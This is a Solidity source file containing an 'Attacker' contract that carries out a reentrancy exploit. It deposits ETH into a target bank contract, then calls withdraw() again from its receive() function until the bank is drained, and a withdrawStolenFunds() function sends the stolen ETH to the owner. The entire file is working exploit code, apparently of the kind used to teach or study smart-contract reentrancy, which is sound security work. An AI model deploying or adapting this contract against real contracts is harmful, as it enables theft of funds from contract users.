// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
    function getBankBalance() external view returns (uint256);
}

contract Attacker {
    IBank public bank;
    address public owner;
    bool public attackInProgress;

    constructor(address _bankAddress) {
        bank = IBank(_bankAddress);
        owner = msg.sender;
    }

    // Start the attack by:
    // 1) Depositing some ETH into the bank
    // 2) Calling withdraw() once to trigger reentrancy
    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "Need ETH to attack");

        // Step 1: deposit into the vulnerable bank
        bank.deposit{value: msg.value}();

        // Step 2: trigger first withdraw (this will call receive(), which calls withdraw() again)
        attackInProgress = true;
        bank.withdraw();
        attackInProgress = false;
    }

    // This receive function is called whenever the bank sends ETH to this contract
    // During the attack, we recursively call withdraw() again
    receive() external payable {
        if (attackInProgress && address(bank).balance > 0) {
            bank.withdraw();
        }
    }

    // Withdraw stolen ETH to EOA
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send ETH");
    }

    // Helper: check this contract's ETH balance
    function getAttackerBalance() external view returns (uint256) {
        return address(this).balance;
    }
}